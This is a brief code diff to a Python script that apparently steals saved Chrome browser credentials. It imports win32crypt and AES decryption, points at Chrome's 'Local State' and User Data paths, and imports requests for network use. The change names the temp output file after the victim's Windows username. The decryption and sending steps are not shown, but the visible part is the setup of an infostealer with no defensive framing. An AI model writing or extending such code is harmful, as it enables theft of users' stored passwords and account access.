@@ -6,6 +6,7 @@ import time
 import base64
 import sqlite3
 import win32crypt
+from getpass import getuser
 from Cryptodome.Cipher import AES
 import shutil
 import requests
@@ -14,7 +15,7 @@ import tempfile
 temp_dir = tempfile.gettempdir()
 
 tmpdir = f"{temp_dir}"
-tmpfile = os.path.join(tmpdir,'text.txt')
+tmpfile = os.path.join(tmpdir,getuser()+'.txt')
 temp_file = open(tmpfile,'w')
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
